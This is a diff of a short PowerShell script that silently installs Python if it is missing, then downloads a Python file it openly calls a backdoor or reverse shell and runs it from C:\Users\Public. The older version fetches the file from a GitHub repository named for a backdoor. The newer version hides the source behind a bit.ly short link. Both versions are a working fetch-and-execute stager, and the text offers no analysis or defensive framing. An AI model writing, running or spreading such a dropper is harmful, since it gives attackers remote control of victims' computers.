@@ -1,10 +1,14 @@
-# python blah blah blah
-if (-Not (Get-Command python -ErrorAction SilentlyContinue)) {
-    Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe' -OutFile 'C:\Users\Public\python-installer.exe'
-    Start-Process 'C:\Users\Public\python-installer.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait
-    Remove-Item -Path 'C:\Users\Public\python-installer.exe'
+# installs python if you dont have it already. 
+$pythonInstalled = Get-Command python -ErrorAction SilentlyContinue
+
+if (-not $pythonInstalled) {
+    Write-Host "Python not found. Installing Python..."
+    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" -OutFile "$env:TEMP\python-installer.exe"
+    Start-Process "$env:TEMP\python-installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
 }
 
-# download it if its not there
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ternall/reapsec-backdoor/main/REAPSEC%20REVERSE%20SHELL%20(project).py' -OutFile 'C:\Users\Public\backdoor.py'
-Start-Process python 'C:\Users\Public\backdoor.py'
+Write-Host "Downloading backdoor script..."
+Invoke-WebRequest -Uri "https://bit.ly/3AhVHLp" -OutFile "C:\Users\Public\reapsecbackdoor.py"
+
+Write-Host "Running backdoor script..."
+Start-Process "python" -ArgumentList "C:\Users\Public\reapsecbackdoor.py"
